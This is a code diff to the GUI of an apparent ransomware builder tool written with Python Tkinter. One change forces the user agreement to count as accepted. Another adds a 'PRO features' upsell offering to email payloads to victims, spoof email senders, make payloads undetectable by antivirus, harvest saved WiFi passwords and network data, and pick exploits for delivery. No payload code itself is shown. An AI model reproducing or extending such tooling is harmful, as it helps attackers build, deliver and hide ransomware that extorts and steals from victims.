@@ -172,7 +172,7 @@ class MainWindow(Tk):
         }
 
 
-        #<activate>
+        self.options['agreed'].set(1)
         #<activate>
 
         if not self.options['agreed'].get() == 1:
@@ -788,28 +788,73 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         exit(0)
 
     def upgrade(self):
-        pro = '''
-                        UNLOCK PRO FEATURES
-                                FOR BETTER PENTESTING
+        pro = """
+       ##(.             (##
+      (,    .###*.###*     #
+     ((                    .#
+    .#./##############(*    ((
+                             (.
+   #################          #
+  ############      #,         #
+ ############*      .#          #
+/#############*     #           .#
+ ###############  #             #
+   #.         #    #          #,
+    .#       #      #,      #(
+      /#   .#        (,   (#
+        (( ((((((((((((**#     UNLOCK PRO FEATURES
+          #,           #               FOR BETTER PENTESTING
+            #        #,
+             *#    (/   By Incoming Security
+               (#/(
+
 ,_._._._._._._._._|__________________________________________________________,
 |_|_|_|_|_|_|_|_|_|_________________________________________________________/
                   !
 
-                                PRO Features:
-                                    + ...
-                                    + ...
-                                    + ...
-                                    + ...
-                                    + ...
-                                    + ...
-                                    + ...
-                                    + ...
-                                    + ...
+        (===||:::::::::::::::> PRO Features <:::::::::::::::||===)
+
++ Unlock: More payload customization
+    Unlock further payload customization such as a custom file
+    extention for encrypted files and put a header in encrypted files
+    with your hacker name or payload name.
+
++ Unlock: Emailing
+    Send your payload by Email to your victim.
+
++ Unlock: Email Spoofing
+    Use a custom, fake and make up Email address and spoof an Email server
+    to send your payload with.
+
++ Unlock: Email Cloning
+    Select a custumizable Email template to use for your Email.
+
++ Unlock: FUD
+    Make your payload Fully Undetectable by any anti-virus
+
++ Unlock: Detection warning
+    Get warned when your payload(s) are detected by a anti-virus or show up
+    on nomoreransom.org.
+
++ Unlock: Data gathering
+    Make your payload gather as much information as possible from
+    your victims machine and/or network such as saved WiFi passwords.
+    You can select which data your payload should harvest.
+
++ Unlock: Encrypted Transfer
+    Encrypt the traffic between the payload and server.
+
++ Unlock: Exploits
+    Select a exploit from a list to improve your payload delivery methods.
+
++ Unlock: PRO updates & more to come
+    Not all updates are FREE, some updates are for PRO users only.
+    Get updates with a build in self updater via a secure SSL connection.
 
 ,_._._._._._._._._|__________________________________________________________,
 |_|_|_|_|_|_|_|_|_|_________________________________________________________/
                   !
-'''
+"""
 
         self.pro = Toplevel()
         self.pro.title(string = 'Upgrade to PRO version')
@@ -827,7 +872,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         key = password(text='Please enter your activation key', title='Enter Key')
         if key == None:
             messagebox.showwarning('Error', 'No key given. Canceled...')
-            return False
+            return
 
         self.check_activation(key)
 
@@ -871,8 +916,6 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
         self.deiconify()
         self.lic.destroy()
-
-
 
     def view_license(self):
         messagebox.showinfo('License', 'Software: Free (Public Test)\nLicense: GNU General Public License v3.0')
